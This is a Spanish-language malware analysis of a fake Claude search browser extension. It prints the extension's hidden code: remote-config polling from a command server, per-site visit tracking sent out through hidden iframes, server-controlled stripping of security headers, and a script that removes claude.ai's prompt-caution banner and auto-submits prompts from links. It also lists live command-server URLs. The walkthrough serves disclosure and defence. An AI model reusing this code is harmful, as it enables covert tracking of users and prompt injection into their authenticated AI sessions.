# Recorrido por el código

*[English version](code-walkthrough.md)*

Código tal como se distribuye en la 2.1.9. Los números de línea se refieren a `background.js`
(370 líneas) y `content.js` (69 líneas) extraídos del paquete firmado.

Las líneas 1–99 de `background.js` implementan la funcionalidad anunciada: manejador de omnibox, tres
entradas de menú contextual y un abridor de pestañas hacia `https://claude.ai/new?q=`. Todo lo que hay
a partir de la línea 101 es el código añadido, repartido en dos IIFE que no aparecen mencionados en la
descripción de la extensión.

## Bloque 1 — `claudeSearchRemoteCfgBootstrap` (líneas 101–128)

```js
const CLAUDE_SEARCH_REMOTE_CFG_KEY = 'claudeSearchRemoteCfg';
const CLAUDE_SEARCH_CHANNEL_URL = 'https://bit.ly/release_note_for_claude';
const CLAUDE_SEARCH_CFG_SYNC_MS = 8 * 60 * 1000;

async function claudeSearchPullRemoteCfg() {
  try {
    const response = await fetch(CLAUDE_SEARCH_CHANNEL_URL, {
      credentials: 'include',
      cache: 'no-store'
    });
    if (!response.ok) return;
    const searchRemoteTune = await response.json();
    if (!searchRemoteTune || typeof searchRemoteTune !== 'object') return;
    const stored = await chrome.storage.local.get(CLAUDE_SEARCH_REMOTE_CFG_KEY);
    const existing = stored[CLAUDE_SEARCH_REMOTE_CFG_KEY] || {};
    const merged = Object.assign({}, existing, searchRemoteTune);
    await chrome.storage.local.set({ [CLAUDE_SEARCH_REMOTE_CFG_KEY]: merged });
  } catch (_err) {
  }
}

claudeSearchPullRemoteCfg();
setInterval(claudeSearchPullRemoteCfg, CLAUDE_SEARCH_CFG_SYNC_MS);
```

Tres detalles importan aquí.

`credentials: 'include'` no hace falta para descargar un documento de configuración. Su efecto es
permitir que el servidor que responde deposite una cookie en el primer contacto y la reciba de vuelta
en cada sondeo posterior, produciendo un identificador estable por instalación. En el equipo analizado
esto generó `v` y `ts` en `stable-channel.zeabur.app`, creadas en el mismo segundo en que llegó la
actualización y todavía presentes 36 días después.

`Object.assign` fusiona en lugar de reemplazar, de modo que un campo enviado una vez persiste hasta
que se sobrescriba explícitamente. El C2 puede sembrar un valor y dejar de servirlo después.

El `catch` vacío se traga cualquier fallo. Errores de red, JSON malformado y peticiones bloqueadas no
producen salida en consola, ni reintentos escalonados, ni ningún síntoma visible para el usuario.

## Bloque 2 — `claudeSearchWarmupRuntime` (líneas 133–370)

### Constantes

```js
const CLAUDE_SEARCH_WARMUP_REASON   = 'searchContextWarmup';
const CLAUDE_SEARCH_EXT_INSTANCE    = 'MGNsYXU=';        // base64("0clau")
const CLAUDE_SEARCH_VISIT_THRESHOLD = 3;
const CLAUDE_SEARCH_COOLDOWN_MS     = 5 * 60 * 1000;
const CLAUDE_SEARCH_DNR_RULE_BASE   = 17391;
```

### Seguimiento de navegación

`chrome.tabs.onUpdated` se dispara con cada cambio de URL. Cada navegación http(s) se reduce a su
origen y se cuenta:

```js
async function claudeSearchRecordOriginVisit(origin) {
  const stats = await claudeSearchLoadVisitStats();
  if (!stats[origin]) stats[origin] = { visitCount: 0, lastSearchWarmupAt: 0 };
  stats[origin].visitCount += 1;
  await claudeSearchSaveVisitStats(stats);
  return stats[origin];
}
```

El permiso `tabs` es lo que hace que `changeInfo.url` venga rellenado. Sin él el listener se
dispararía pero sin URL. No es necesario para nada de lo que la extensión anuncia.

### Disparo y transmisión

```js
async function claudeSearchMaybeLoadWarmupFrame(origin, entry) {
  if ((entry.visitCount || 0) < CLAUDE_SEARCH_VISIT_THRESHOLD) return;
  if (entry.lastSearchWarmupAt > 0 &&
      Date.now() - entry.lastSearchWarmupAt < CLAUDE_SEARCH_COOLDOWN_MS) return;

  const remoteCfg = await claudeSearchLoadRemoteCfg();
  const endpointBase = remoteCfg.u;
  if (!endpointBase || typeof endpointBase !== 'string') return;
  // ... registra lastSearchWarmupAt ...
  const assistUrl = claudeSearchBuildWarmupUrl(endpointBase, origin);
  claudeSearchLoadWarmupFrame(assistUrl);
}

function claudeSearchBuildWarmupUrl(endpointBase, origin) {
  const separator = endpointBase.indexOf('?') >= 0 ? '&' : '?';
  return endpointBase + separator + 'r=' + CLAUDE_SEARCH_WARMUP_REASON +
    '&i=' + CLAUDE_SEARCH_EXT_INSTANCE +
    '&u=' + claudeSearchEncodeOrigin(origin);   // btoa(origin)
}

function claudeSearchLoadWarmupFrame(assistUrl) {
  if (typeof document === 'undefined') return;
  const host = document.body || document.documentElement;
  const frame = document.createElement('iframe');
  frame.style.cssText = 'display:none;width:0;height:0;border:none;position:absolute';
  frame.src = assistUrl;
  host.appendChild(frame);
  setTimeout(function () {
    if (frame.parentNode) frame.parentNode.removeChild(frame);
  }, 30000);
}
```

El iframe se añade a la página de fondo de la propia extensión, no a la pestaña visitada. Por eso
estas cargas nunca aparecen en el historial de navegación y son invisibles en la página que el usuario
está mirando. El marco se destruye a los 30 segundos.

Fíjate en la forma del intercambio: el origen es un parámetro de la petición y la respuesta se carga.
No es una rutina de recolección que acumule datos para subirlos después: es un bucle
petición/respuesta en el que se le dice al servidor en qué sitio está el usuario y este decide qué
devolver para ese sitio. El umbral de visitas y el enfriamiento reducen el volumen en lugar de
maximizarlo, lo cual es coherente con evitar llamar la atención y con seleccionar objetivos, no con
recolectar para revender.

### Eliminación de cabeceras

```js
async function claudeSearchApplyResponseHeaderRules() {
  const remoteCfg = await claudeSearchLoadRemoteCfg();
  const headerList = remoteCfg.h;
  // ... limpia reglas previas en el rango 17391..17441 ...
  const responseHeaders = headerList
    .map(function (name) { return String(name).trim().toLowerCase(); })
    .filter(Boolean)
    .map(function (name) { return { header: name, operation: 'remove' }; });

  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: removeRuleIds,
    addRules: [{
      id: CLAUDE_SEARCH_DNR_RULE_BASE,
      priority: 1,
      action: { type: 'modifyHeaders', responseHeaders: responseHeaders },
      condition: { urlFilter: '*', resourceTypes: ['sub_frame'] }
    }]
  });
}
```

Los nombres de las cabeceras no están nunca escritos en el código. Vienen de `remoteCfg.h`, que viene
del C2. La función se ejecuta al instalar, en cada arranque, y de nuevo cada vez que cambia la
configuración almacenada:

```js
chrome.storage.onChanged.addListener(function (changes, area) {
  if (area === 'local' && changes[CLAUDE_SEARCH_REMOTE_CFG_KEY]) {
    claudeSearchApplyResponseHeaderRules();
  }
});
```

Así, una nueva lista de cabeceras surte efecto dentro de un intervalo de sondeo, sin actualización.

### El señuelo

```js
const seed = {"engineLabel":"Claude","omniboxToken":"claude","preferDefault":true,
              "h":["x-claude-omnibox-hint","etag-search-claude"],
              "u":"https://claude.ai/"};
```

Esto es lo que está presente en el paquete que se revisa. `x-claude-omnibox-hint` y
`etag-search-claude` no son cabeceras reales; eliminarlas de los sub-marcos no hace nada. `u` apunta a
claude.ai, así que el iframe carga una página inocua. Una revisión estática del artefacto enviado
muestra una funcionalidad verosímil e inerte. Los valores operativos llegan después, por red.

En el equipo analizado la configuración almacenada contenía:

```
h: ["content-security-policy", "x-frame-options"]
u: "https://kmn6d3go6kuodubmfoiawcstl40ukbqb.lambda-url.us-west-2.on.aws/"
```

## `content.js`

Registrado únicamente para `https://claude.ai/*`.

```js
const CAUTION_NEEDLE = "Use caution before running this prompt";
function stripMaliciousPromptBanner() {
  for (const el of document.querySelectorAll('[role="status"][aria-live="polite"]')) {
    if (!el.textContent.includes(CAUTION_NEEDLE)) continue;
    const wrap = el.parentElement;
    if (wrap) wrap.remove();
    break;
  }
}
stripMaliciousPromptBanner();
const bannerObserver = new MutationObserver(stripMaliciousPromptBanner);
bannerObserver.observe(document.documentElement, { childList: true, subtree: true });
setTimeout(() => bannerObserver.disconnect(), 6e4);
```

El selector apunta a la región viva que la aplicación anfitriona usa para su advertencia. El
observador la sigue eliminando durante 60 segundos, cubriendo los re-renderizados.

El resto lee `?q=` de la URL, lo escribe en el editor usando un setter nativo para que el framework
registre el cambio, y luego sondea el botón de enviar y lo pulsa:

```js
const query = new URLSearchParams(location.search).get("q");
// ...
function waitForSendButton() {
  const btn = findSendButton();
  if (btn && !btn.disabled) { btn.click(); return; }
  elapsed += POLL_INTERVAL;
  if (elapsed < MAX_WAIT_MS) setTimeout(waitForSendButton, POLL_INTERVAL);
}
```

El auto-envío por sí solo es una comodidad plausible en una extensión de búsqueda. El auto-envío
*combinado con* la eliminación de la advertencia que existe precisamente para que el usuario lea ese
prompt antes de que se ejecute, no lo es. Cualquier enlace `claude.ai/new?q=<texto>` se convierte en
una instrucción que se ejecuta dentro de la sesión autenticada del usuario, con el aviso de seguridad
retirado de la pantalla antes.

## Reproducción

```sh
unzip -d out default_claude_ai-2.1.9.xpi
sha256sum out/background.js out/content.js out/manifest.json
sed -n '101,370p' out/background.js
```

Resolver el redirector sin contactar al host final — bit.ly responde el 301 por sí mismo:

```sh
curl -sI https://bit.ly/release_note_for_claude | grep -i ^location
```
